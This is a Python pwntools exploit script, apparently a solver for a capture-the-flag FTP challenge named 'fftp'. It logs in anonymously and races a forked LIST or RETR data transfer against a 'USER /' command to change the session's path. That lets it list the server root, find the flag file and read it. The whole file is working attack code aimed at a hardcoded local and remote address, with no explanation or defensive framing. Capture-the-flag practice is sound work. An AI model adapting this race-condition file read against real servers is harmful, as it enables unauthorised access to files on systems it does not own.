#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 172.17.0.1 --port 2121 ./fftp
from pwn import *
import os
import sys
import time

# Set up pwntools for the correct architecture
# exe = context.binary = ELF('./fftp', checksec=False)

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '172.17.0.1'
port = int(args.PORT or 2121)

host_remote = args.HOST or '47.89.253.219'
port_remote = int(args.PORT or 2121)
HOST = ""


def start_remote(argv=[], *a, **kw):
  '''Connect to the process on the remote host'''
  global HOST
  HOST = host_remote
  io = connect(host_remote, port_remote)
  if args.GDB:
    gdb.attach(io, gdbscript=gdbscript)
  return io


def start_local(argv=[], *a, **kw):
  '''Connect to the process on the remote host'''
  global HOST
  HOST = host
  io = connect(host, port)
  if args.GDB:
    gdb.attach(io, gdbscript=gdbscript)
  return io


def start(argv=[], *a, **kw):
  '''Start the exploit against the target.'''
  if args.REMOTE:
    return start_remote(argv, *a, **kw)
  else:
    return start_local(argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled
# FORTIFY:  Enabled
TERM_LINE = b'\r\n'
PATH_MAX = 4096


def send_cmd(cmd, debug=False):
  cmd = cmd if type(cmd) is bytes else cmd.encode()  # encode if "str"
  if debug:
    log.info("CMD: %s" % (cmd.decode()))
  io.sendline(cmd)
  data = b''
  try:
    data = io.recv()
  except:
    pass
  if debug:
    io.indented(data.decode())
  return data


def data_cmd(cmd, debug=False):
  cmd = cmd if type(cmd) is bytes else cmd.encode()  # encode if "str"
  data_port = send_cmd("EPSV", True).split(b"|")[3]
  data_io = connect(HOST, data_port)
  if debug:
    log.info("CMD: %s" % (cmd))
  send_cmd(cmd)
  data = b''
  try:
    data = data_io.recv()
  except:
    pass
  if debug:
    io.indented(data.decode())
  data_io.close()
  return data


def race_change_file(cmd, debug=False, callback=lambda: None):
  cmd = cmd if isinstance(cmd, (bytes)) else cmd.encode()  # encode if "str"
  data_port = send_cmd("EPSV", True).split(b"|")[3]

  p = os.fork()
  if p == 0:
    send_cmd(cmd)
    sys.exit(0)
  time.sleep(0.0005)  # wait a little bit
  callback()

  data_io = connect(HOST, data_port)
  data = b''
  while True:
    try:
      data = data_io.recv()
    except EOFError:
      break
  data_io.close()
  return data

io = start()
io._newline = TERM_LINE

banner = io.recv()
log.success(banner.decode() + "\n")

send_cmd(b"USER anonymous", True)
send_cmd(b"PASS anonymous", True)
root_dirs = race_change_file(b"LIST", debug=True,
                             callback=lambda: send_cmd(b"USER /", True))
flag_i = root_dirs.find(b'flag')
if flag_i == -1:
  log.error("Not found flag in root dir")
  exit(-1)

flag_name = root_dirs[flag_i:flag_i + 41]
log.success("Get flag name: " + flag_name.decode())

send_cmd(b"USER anonymous", True)
send_cmd(b"PASS anonymous", True)
flag = race_change_file(b"RETR hello.txt", debug=True,
                             callback=lambda: send_cmd(b"USER /" + flag_name, True)).decode()
print()
log.success("Flag: " + flag)
open("flag.txt", "w").write(flag)
print()

io.close()